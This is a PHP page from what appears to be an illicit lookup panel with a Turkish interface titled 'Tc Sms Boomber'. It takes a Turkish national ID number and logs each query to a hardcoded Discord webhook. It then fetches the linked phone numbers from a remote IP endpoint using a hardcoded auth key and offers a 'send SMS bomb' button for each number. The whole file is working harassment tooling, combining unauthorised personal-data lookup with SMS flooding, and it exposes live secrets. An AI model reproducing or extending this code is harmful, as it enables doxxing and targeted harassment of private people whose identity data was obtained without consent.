<?php require 'inc/_global/config.php'; ?>
<?php require 'inc/backend/config.php'; ?>
<?php require 'inc/_global/views/head_start.php'; ?>
<?php require 'inc/_global/views/head_end.php'; ?>
<?php require 'inc/_global/user.php'; ?>
<?php require 'inc/_global/token.php'; ?>
<?php require 'inc/_global/views/page_start.php'; ?>
<?php $one->get_css('js/plugins/datatables-bs5/css/dataTables.bootstrap5.min.css'); ?>
<?php $one->get_css('js/plugins/datatables-buttons-bs5/css/buttons.bootstrap5.min.css'); ?>
<?php $one->get_css('js/plugins/datatables-responsive-bs5/css/responsive.bootstrap5.min.css'); ?>
<style>
table.table-bordered>tbody>tr>td {
    border: 1px solid #364054;
}

table.table-bordered>tbody>tr>th {
    border: 1px solid #364054;
}
</style>
<div class="content">
<form action="tc-smsbomber.jsp" method="post">
    <h2>Tc Sms Boomber</h2>
    <div class="row">
        <div class="col-md-12">
            <div class="col-lg-8 col-xl-5">
                <div class="mb-4">
                    <div class="input-group">
                        <span class="input-group-text">TC</span>
                        <input id="tc" name="tc" type="text" class="form-control">
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-12">
            <div class="col-lg-8 col-xl-5">
                <div class="mb-4">
                    <input class="btn btn-secondary" onclick="" type="submit" value="Sorgula">
                </div>
            </div>
        </div>
    </div>
</form>
<div class="row gx-12">
        <div class="col-xl-12 col-lg-6">
            <div class="table-responsive">
                <table id="t" class="table table-bordered table-striped table-vcenter">
                    <thead>
                        <tr>
                            <th>TC</th>
                            <th>GSM</th>
                            <th>Sms</th>
                        </tr>
                    </thead>
                    <tbody id="tbod">
    <?php
	if(isset($_POST["tc"])){
        $tcs = $_POST["tc"];
        $notify .= "One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Sorgu Başarılı ! '});";
        $url = "https://discord.com/api/webhooks/1070487538143342723/Pd5p_dpd_K3MyVHUcMsl1gDGF1h93P4yVW1kuskcC2u7HTIg1EyzvY64TqkEwwKYDR0L";
        $headers = [ 'Content-Type: application/json; charset=utf-8' ];
        $POST = ['username' => 'Sorgu Denetleyicisi', 'content' => $username.' Adlı Kullanıcı Tc Sms Boomber Sorgusu Yaptı! Yaptığı Sorgu TC: '.$tcs ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        $response   = curl_exec($ch);
        $ailelink = "http://20.5.93.205/kimlik/woxy/tcgsm.php?tc=".$tcs."&auth=woxynindaramcigi";
        $kr=file_get_contents($ailelink);
$KrJson =json_decode($kr,true);
     
foreach($KrJson as $key => $value){
    $tc=$value["TC"];
    if($value["GSM"]){
        $istek = $value["GSM"];
    }else{
        $istek = "-";
    }
	echo "<tr><form action='smsbomber.jsp' method='post'>
                        <td>".$tc."</td>
                        <td>".$istek."</td>
                        <td><input type='text' name='tel' id='tel' style='display:none;' value=".$istek."><input type='submit' class='btn btn-secondary'  value='Sms Bomb Gönder'></td>
                        </form></tr>";
                 
	}
					}
	?>
           </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<?php require 'inc/_global/views/page_end.php'; ?>
<?php require 'inc/_global/views/footer_start.php'; ?>
<?php $one->get_js('js/lib/jquery.min.js'); ?>
<?php $one->get_js('js/plugins/jquery-validation/jquery.validate.min.js'); ?>
<?php $one->get_js('js/pages/op_auth_signin.min.js'); ?>
<?php require 'inc/_global/views/footer_end.php'; ?>